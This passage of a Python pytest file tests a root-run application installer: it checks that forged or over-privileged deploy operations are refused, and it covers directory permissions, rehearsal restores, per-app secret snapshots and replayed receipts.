    forged_op = operation.model_copy(
        update={
            "kind": "deploy",
            "approval": operation.approval.model_copy(update={"selection": selection}),
        }
    )
    forged_authority(
        installer,
        authority,
        app,
        forged_op,
        monkeypatch,
        archive_base64=base64.b64encode(archive).decode(),
    )
    units = Path(installer.policy.units)
    units.mkdir()
    monkeypatch.delattr(installer, "lifecycle")
    monkeypatch.setattr(installer, "command", lambda *a, **k: "")
    installer.execute(forged_op.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{forged_op.operation_id}.receipt.json").read_bytes()
    )
    assert (receipt.state, receipt.error) == ("failed", "policy_refused")
    assert events == [] and list(units.iterdir()) == []


def test_settings_change_the_host_policy_lacks_is_refused_as_policy(
    helper, monkeypatch
):
    installer, operation, authority, app, _release, events = helper
    raised = app.registration.model_dump(mode="json")
    raised["bindings"]["resources"]["memory_bytes"] = 512 * 1024 * 1024
    deploy = operation.model_copy(update={"kind": "deploy"})
    forged_authority(
        installer,
        authority,
        app,
        deploy,
        monkeypatch,
        registration=app.registration.model_validate_json(json.dumps(raised)),
    )
    with pytest.raises(PolicyRefused, match="update the host policy"):
        installer.authority(deploy)
    installer.execute(deploy.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{deploy.operation_id}.receipt.json").read_bytes()
    )
    assert (receipt.state, receipt.error) == ("failed", "policy_refused")
    assert events == []


def test_generation_comes_from_the_root_journal_not_the_core_selection(
    helper, tmp_path, monkeypatch
):
    installer, operation, authority, app, release, _ = helper
    backups = tmp_path / "backups"
    backups.mkdir()
    kept = f"pre-switch-g3-{uuid4()}.sqlite"
    (backups / kept).write_bytes(b"previous set")
    monkeypatch.setattr(
        installer, "backup", lambda app, f, d, **_: d.write_bytes(b"copy")
    )
    selection = operation.approval.selection.model_copy(update={"generation": 40})
    previous = InstalledSnapshot(
        operation_id=uuid4(),
        generation=3,
        selection=operation.approval.selection.model_copy(update={"generation": 2}),
        registration=app.registration,
        image=release.image,
        image_id="sha256:" + "b" * 64,
    )
    deploy = operation.model_copy(
        update={
            "kind": "deploy",
            "approval": operation.approval.model_copy(update={"selection": selection}),
        }
    )
    installed_by_root(installer, previous)
    deployed = authority.model_copy(update={"operation": deploy, "previous": previous})
    monkeypatch.setattr(installer, "authority", lambda *_: (deployed, app, release))
    monkeypatch.setattr(
        installer,
        "child",
        lambda *a: b"switching"
        if a[2] == "state"
        else deploy.model_dump_json().encode(),
    )
    monkeypatch.setattr(installer, "owned", lambda *_: None)
    for name in ("stop_timers", "remove", "start", "probe"):
        monkeypatch.setattr(installer, name, lambda *a, **k: None)
    installer.execute(deploy.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{deploy.operation_id}.receipt.json").read_bytes()
    )
    assert receipt.state == "succeeded"
    assert receipt.installed is not None and receipt.installed.generation == 4
    assert installer.current(app) == receipt.installed
    assert {path.name for path in backups.iterdir()} == {
        kept,
        f"pre-switch-g4-{deploy.operation_id}.sqlite",
    }, "core generation pruned the previous set"


def test_root_run_sweeps_stale_scratch_directories(helper, tmp_path, monkeypatch):
    installer, *_ = helper
    scratch = Path(installer.policy.scratch)
    stale = [
        scratch / f"{prefix}-k3j9x_q1" for prefix in ("rehearsal", "input", "backup")
    ]
    for directory in stale:
        (directory / "state").mkdir(parents=True)
        (directory / "state" / ".notes.db").write_bytes(b"production copy")
    (scratch / "unrelated").mkdir()
    (scratch / "rehearsal-file").write_bytes(b"")
    monkeypatch.setattr(managed_installer, "load_policy", lambda _: installer.policy)
    monkeypatch.setattr(managed_installer, "validate_paths", lambda _: None)
    monkeypatch.setattr(Installer, "trigger", lambda self: None)
    monkeypatch.setattr(
        sys, "argv", ["installer", "--policy", str(tmp_path / "p.json")]
    )
    managed_installer.main()
    assert not any(directory.exists() for directory in stale)
    assert (scratch / "unrelated").is_dir() and (scratch / "rehearsal-file").is_file()


def can_open(path, uid, gid, owners, want=4, below=None):
    def allowed(node, bits):
        info = node.lstat()
        owner_uid, owner_gid = owners.get(info.st_ino, (0, 0))
        shift = 6 if uid == owner_uid else 3 if gid == owner_gid else 0
        return (stat.S_IMODE(info.st_mode) >> shift) & bits == bits

    parents = [
        parent for parent in path.parents if parent == below or below in parent.parents
    ]
    return all(allowed(parent, 1) for parent in parents) and allowed(path, want)


def test_rehearsal_restore_check_source_opens_under_the_app_uid(
    helper, tmp_path, monkeypatch
):
    installer, _, authority, app, release, _ = helper
    owners = {}
    monkeypatch.setattr(
        managed_installer.os,
        "chown",
        lambda path, uid, gid: owners.__setitem__(
            Path(path).lstat().st_ino, (uid, gid)
        ),
    )
    monkeypatch.setattr(
        managed_installer.os,
        "fchown",
        lambda fd, uid, gid: owners.__setitem__(os.fstat(fd).st_ino, (uid, gid)),
    )
    monkeypatch.setattr(installer, "remove", lambda *_: None)
    monkeypatch.setattr(installer, "start", lambda *a, **k: "hp-rehearsal-notes")
    monkeypatch.setattr(installer, "rehearsal_ready", lambda *_: None)
    monkeypatch.setattr(installer, "semantic_state", lambda *_: "records")
    scratch = Path(installer.policy.scratch)
    os.chmod(scratch, 0o711)
    copies = []

    def child(uid, gid, kind, source, target):
        assert kind == "backup"
        source, target = Path(source), Path(target)
        if not can_open(source, uid, gid, owners, below=scratch):
            raise ContractError("Host operation failed")
        if not can_open(target.parent, uid, gid, owners, want=3, below=scratch):
            raise ContractError("Host operation failed")
        if copies:
            # The root-owned copy awaiting the restore check stays private.
            check = copies[0].parent.parent / "state.sqlite"
            assert not can_open(check, uid, gid, owners, below=scratch)
        copies.append(source)
        target.write_bytes(b"sqlite copy")
        return json.dumps(
            {
                "sha256": hashlib.sha256(b"sqlite copy").hexdigest(),
                "tables": ["entries"],
                "content_sha256": "c" * 64,
            }
        ).encode()

    monkeypatch.setattr(installer, "child", child)
    backup = tmp_path / "input.sqlite"
    publish(backup, b"live database")
    rehearsal = Installer.rehearse(
        installer, authority, app, release, "sha256:" + "b" * 64, backup
    )
    assert rehearsal.checks["restore"] is True
    assert [path.name for path in copies] == [".notes.db", "restored.sqlite"]


def test_rehearsal_root_is_private_to_root_and_the_app_group(helper, monkeypatch):
    installer, _, authority, app, release, _ = helper
    owners = {}
    monkeypatch.setattr(
        managed_installer.os,
        "chown",
        lambda path, uid, gid: owners.__setitem__(Path(path), (uid, gid)),
    )
    monkeypatch.setattr(installer, "remove", lambda *_: None)
    seen = []
    monkeypatch.setattr(
        installer,
        "start",
        lambda *args, **kwargs: seen.append(
            (
                stat.S_IMODE(kwargs["rehearsal"].parent.stat().st_mode),
                owners.get(kwargs["rehearsal"].parent),
            )
        ),
    )
    monkeypatch.setattr(installer, "rehearsal_ready", lambda *_: None)
    monkeypatch.setattr(installer, "semantic_state", lambda *_: "records")
    monkeypatch.setattr(installer, "backup", lambda *args, **kwargs: None)
    Installer.rehearse(installer, authority, app, release, "sha256:" + "b" * 64, None)
    assert seen == [(0o710, (0, app.gid))]


def test_secret_snapshots_of_one_app_never_prune_another_apps(
    helper, tmp_path, monkeypatch
):
    installer, _, authority, app, release, _ = helper
    monkeypatch.setattr(managed_installer.os, "chown", lambda *_: None)
    monkeypatch.setattr(managed_installer.os, "chmod", lambda *_: None)
    credentials = installer.journal / "credentials"
    credentials.mkdir()
    monkeypatch.setattr(
        installer, "credential_snapshot", lambda *_: credentials / "credential"
    )

    def host_app(app_id, secret_name):
        secret = tmp_path / "secrets" / (app_id + "-" + secret_name)
        secret.parent.mkdir(exist_ok=True)
        secret.write_bytes(b"secret for " + secret.name.encode())
        bindings = app.registration.bindings.model_copy(
            update={
                "secret_files": (SecretFile(name=secret_name, file_path=str(secret)),)
            }
        )
        registration = app.registration.model_copy(
            update={"app_id": app_id, "bindings": bindings}
        )
        return app.model_copy(update={"registration": registration})

    def snapshot(host):
        spec = installer.spec(authority, host, release)
        return Path(
            next(
                mount.source
                for mount in spec.mounts
                if mount.source.startswith(str(credentials) + "/")
                and mount.source != str(credentials / "credential")
            )
        )

    sibling = snapshot(host_app("notes-api", "key"))
    current = snapshot(host_app("notes", "api-key"))
    assert sibling.exists() and current.exists() and sibling != current
    stale = current.with_name(current.name[:-64] + "0" * 64)
    stale.write_bytes(b"old")
    snapshot(host_app("notes", "api-key"))
    assert sibling.exists() and current.exists()
    assert not stale.exists()


@pytest.mark.parametrize("swap", [True, False])
def test_limits_require_swap_accounting_before_host_effects(helper, monkeypatch, swap):
    installer, *_ = helper
    info = {
        "MemoryLimit": True,
        "PidsLimit": True,
        "CpuCfsQuota": True,
        "SwapLimit": swap,
    }
    monkeypatch.setattr(installer, "command", lambda *_, **__: json.dumps(info))
    if swap:
        Installer.limits(installer)
    else:
        with pytest.raises(ContractError, match="resource controllers"):
            Installer.limits(installer)


@pytest.mark.parametrize("mode", [0o700, 0o750, 0o701])
def test_validate_paths_requires_a_backup_directory_private_to_root(
    helper, tmp_path, monkeypatch, mode
):
    installer, *_ = helper
    backups = Path(str(installer.policy.apps[0].registration.bindings.backup_directory))
    backups.mkdir()
    os.chmod(backups, mode)
    monkeypatch.setattr(installer_policy, "root_path", lambda *_, **__: None)
    monkeypatch.setattr(installer_policy, "read_owned", lambda *_, **__: b"credential")
    monkeypatch.setattr(installer_policy.sys, "flags", SimpleNamespace(isolated=1))
    monkeypatch.setattr(installer_policy.os, "geteuid", lambda: 0)
    if mode == 0o700:
        validate_paths(installer.policy)
    else:
        with pytest.raises(ContractError, match="private to root"):
            validate_paths(installer.policy)


@pytest.mark.parametrize("mode", [0o711, 0o700, 0o710])
def test_validate_paths_requires_scratch_traversable_by_app_accounts(
    helper, monkeypatch, mode
):
    installer, *_ = helper
    backups = Path(str(installer.policy.apps[0].registration.bindings.backup_directory))
    backups.mkdir()
    os.chmod(backups, 0o700)
    os.chmod(installer.policy.scratch, mode)
    monkeypatch.setattr(installer_policy, "root_path", lambda *_, **__: None)
    monkeypatch.setattr(installer_policy, "read_owned", lambda *_, **__: b"credential")
    monkeypatch.setattr(installer_policy.sys, "flags", SimpleNamespace(isolated=1))
    monkeypatch.setattr(installer_policy.os, "geteuid", lambda: 0)
    if mode == 0o711:
        validate_paths(installer.policy)
    else:
        with pytest.raises(ContractError, match="traversable"):
            validate_paths(installer.policy)


def test_replayed_success_receipt_restores_the_current_record_then_the_spool_copy(
    helper,
):
    installer, operation, _, app, release, events = helper
    snapshot = core_snapshot(operation, app, release.image)
    receipt = Receipt(
        operation_id=snapshot.operation_id,
        selection=operation.approval.selection,
        state="succeeded",
        installed=snapshot,
        authorization_committed=True,
    )
    publish(
        installer.journal / f"{snapshot.operation_id}.receipt.json",
        receipt.model_dump_json().encode(),
    )
    spool_copy = (
        Path(installer.policy.spool) / "receipts" / f"{snapshot.operation_id}.json"
    )
    for _ in range(2):
        installer.execute(snapshot.operation_id)
        assert installer.current(app) == snapshot
        assert Receipt.model_validate_json(spool_copy.read_bytes()) == receipt
    assert events == [], "a replay must not touch the host"
    newer = snapshot.model_copy(update={"operation_id": uuid4(), "generation": 2})
    installed_by_root(installer, newer)
    spool_copy.unlink()
    installer.execute(snapshot.operation_id)
    assert installer.current(app) == newer, "a stale replay moved the record back"
